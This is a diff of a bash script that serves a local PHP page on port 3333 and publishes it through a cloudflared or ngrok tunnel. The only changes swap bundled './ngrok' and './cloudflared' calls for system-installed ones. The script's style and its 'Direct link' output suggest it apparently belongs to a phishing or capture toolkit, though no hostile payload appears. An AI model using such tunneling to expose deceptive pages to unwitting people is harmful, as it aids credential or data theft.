@@ -268,7 +268,7 @@ rm -rf .cloudflared.log > /dev/null 2>&1 &
 if [[ "$windows_mode" == true ]]; then
     ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
 else
-    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
+    cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
 fi
 
 sleep 10
@@ -279,7 +279,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might b
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1:3333\n"
 exit 1
 else
@@ -413,18 +413,18 @@ else
         read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
         if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
             read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-            ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
+            ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
             printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
         fi
     else
         read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-        ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
+        ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
     fi
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
     php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
     sleep 2
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-    ./ngrok http 3333 > /dev/null 2>&1 &
+    ngrok http 3333 > /dev/null 2>&1 &
 fi
 
 sleep 10
@@ -436,7 +436,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ngrok http 3333\n"
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
